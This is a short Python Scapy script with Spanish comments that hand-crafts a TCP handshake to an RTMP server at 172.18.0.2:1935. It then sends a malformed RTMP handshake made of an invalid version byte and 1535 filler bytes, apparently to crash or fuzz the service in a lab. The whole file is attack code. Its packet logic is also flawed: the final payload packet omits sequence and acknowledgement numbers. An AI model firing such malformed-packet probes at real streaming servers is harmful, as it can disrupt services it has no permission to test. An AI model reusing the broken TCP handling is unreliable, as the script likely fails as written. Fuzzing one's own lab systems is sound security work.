from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

target_ip = "172.18.0.2"
target_port = 1935

# Establecer conexión TCP (3-way handshake)
syn = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
syn_ack = sr1(syn, verbose=0)  # Esperar SYN-ACK
ack = IP(dst=target_ip) / TCP(dport=target_port, sport=syn_ack[TCP].dport, flags="A", seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
send(ack, verbose=0)

# Enviar handshake RTMP malformado (C0 + C1)
malformed_handshake = b"\x05" + b"\x41" * 1535  # Versión 5 (inválida) + basura
send(IP(dst=target_ip) / TCP(dport=target_port, sport=syn_ack[TCP].dport, flags="PA") / Raw(load=malformed_handshake), verbose=1)